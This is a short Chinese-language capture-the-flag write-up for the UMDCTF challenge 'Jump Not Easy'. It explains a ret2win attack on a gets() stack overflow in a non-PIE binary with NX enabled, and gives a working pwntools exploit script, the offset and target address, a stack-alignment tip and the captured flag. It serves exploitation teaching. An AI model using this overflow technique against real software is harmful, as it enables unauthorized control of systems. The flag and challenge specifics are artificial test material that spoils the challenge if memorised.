# Jump Not Easy

## 题目简述

第二个程序仍有 `gets()` 栈溢出，但 NX 已启用，不能直接执行栈上 shellcode。二进制不启用 PIE，并自带一个读取/输出 flag 的 `get_flag` 函数，因此使用 ret2win。

## 解题过程

`checksec` 显示固定代码地址，反汇编可找到：

```text
get_flag = 0x40125d
```

cyclic pattern 确认覆盖 RIP 的偏移仍为 `72`。构造：

```python
from pwn import *

elf = context.binary = ELF("./jump_not_easy")
io = process(elf.path)

payload = b"A" * 72
payload += p64(elf.symbols["get_flag"])
io.sendline(payload)
print(io.recvall().decode(errors="replace"))
```

若远端 glibc 对栈对齐敏感，可在目标函数前增加一个单独的 `ret` gadget，使进入函数时满足 16 字节对齐。

程序输出：

```text
UMDCTF-{wh323_423_WE_G01n9_n3xt?}
```

## 方法总结

NX 只阻止数据页执行，不阻止复用现有代码。无 PIE 让 `get_flag` 地址固定，因而无需泄漏基址。ret2win 的完整检查项是溢出偏移、目标函数地址、调用约定和栈对齐。
